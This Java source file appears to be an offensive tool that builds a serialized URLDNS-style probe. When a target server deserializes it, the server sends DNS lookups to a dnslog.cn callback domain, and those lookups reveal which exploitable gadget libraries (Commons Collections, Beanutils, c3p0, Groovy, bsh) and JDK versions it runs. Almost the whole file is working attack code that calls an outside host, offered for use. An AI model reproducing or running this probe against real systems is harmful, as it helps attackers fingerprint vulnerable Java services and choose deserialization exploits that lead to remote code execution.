import javassist.ClassPool;
import javassist.CtClass;

import java.io.*;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLStreamHandler;
import java.util.HashMap;
import java.util.LinkedList;

public class ScanClassOneForAll {
    public static void main(String[] args) throws Exception {
//        serial("JSON.ser");
        unserial("JSON.ser");
    }

    public static String domain = "yeau28.dnslog.cn";

    public static void serial(String file) throws Exception {

        LinkedList<Object> linkedList = new LinkedList<Object>();
        // CommonsCollections1/3/5/6/7链,需要<=3.2.1版本
        linkedList.add(getHashMap("cc31or321","org.apache.commons.collections.functors.ChainedTransformer"));
        linkedList.add(getHashMap("cc322","org.apache.commons.collections.ExtendedProperties$1"));

        // CommonsCollections2/4链,需要4-4.0版本
        linkedList.add(getHashMap("cc40", "org.apache.commons.collections4.functors.ChainedTransformer"));
        linkedList.add(getHashMap("cc41", "org.apache.commons.collections4.FluentIterable"));

        // CommonsBeanutils2链,serialVersionUID不同,1.7x-1.8x为-3490850999041592962,1.9x为-2044202215314119608
        linkedList.add(getHashMap("cb17", "org.apache.commons.beanutils.MappedPropertyDescriptor$1"));
        linkedList.add(getHashMap("cb18x", "org.apache.commons.beanutils.DynaBeanMapDecorator$MapEntry"));
        linkedList.add(getHashMap("cb17", "org.apache.commons.beanutils.BeanIntrospectionData"));

        // c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
        linkedList.add(getHashMap("c3p092x", "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase"));
        linkedList.add(getHashMap("c3p092x", "com.mchange.v2.c3p0.test.AlwaysFailDataSourc"));

        // AspectJWeaver,需要cc31
        linkedList.add(getHashMap("ajw", "org.aspectj.weaver.tools.cache.SimpleCache"));

        // bsh,serialVersionUID不同,2.0b4为4949939576606791809,2.0b5为4041428789013517368,2.0.b6无法反序列化
        linkedList.add(getHashMap("bsh20b4", "bsh.CollectionManager$1"));
        linkedList.add(getHashMap("bsh20b5", "bsh.engine.BshScriptEngine"));
        linkedList.add(getHashMap("bsh20b6", "bsh.collection.CollectionIterator$1"));

        // Groovy,1.7.0-2.4.3,serialVersionUID不同,2.4.x为-8137949907733646644,2.3.x为1228988487386910280
        linkedList.add(getHashMap("groovy1702311", "org.codehaus.groovy.reflection.ClassInfo$ClassInfoSet"));
        linkedList.add(getHashMap("groovy1702311", "groovy.lang.Tuple2"));
        linkedList.add(getHashMap("groovy1702311", "org.codehaus.groovy.runtime.dgm$1170"));

        // Becl,JDK<8u251
        linkedList.add(getHashMap("bcel", "com.sun.org.apache.bcel.internal.util.ClassLoader"));

        // JDK<=7u21
        linkedList.add(getHashMap("Jdk7u21", "com.sun.corba.se.impl.orbutil.ORBClassLoader"));

        // 7u25<=JDK<=8u20,虽然叫JRE8u20其实JDK8u20也可以,这个检测不完美,8u25版本以及JDK<=7u21会误报,可综合Jdk7u21来看
        linkedList.add(getHashMap("Jdk8u20", "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1"));

        // windows/linux版本判断
        linkedList.add(getHashMap("linux", "sun.awt.X11.AwtGraphicsConfigData"));
        linkedList.add(getHashMap("windows", "sun.awt.windows.WButtonPeer"));

        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream(file));
        objectOutputStream.writeObject(linkedList);
    }

    public static HashMap getHashMap(String flag, String classname) throws Exception{
        URLStreamHandler URLStreamHanderObj = new URLStreamHandler() {
            @Override
            protected URLConnection openConnection(URL u) throws IOException {
                return null;
            }

            @Override
            protected int hashCode(URL u) {
                return -1;
            }
        };

        HashMap hashMap = new HashMap();
        hashMap.put(new URL(null, "http://" + flag + "." + domain, URLStreamHanderObj),
                makeClass(classname)
        );

        return hashMap;
    }

    public static void unserial(String file) throws Exception {
        FileInputStream fileInputStream = new FileInputStream(file);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
    }

    public static Class makeClass(String clazzName) throws Exception {
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass(clazzName);
        Class clazz = ctClass.toClass();
        ctClass.defrost();
        return clazz;
    }
}
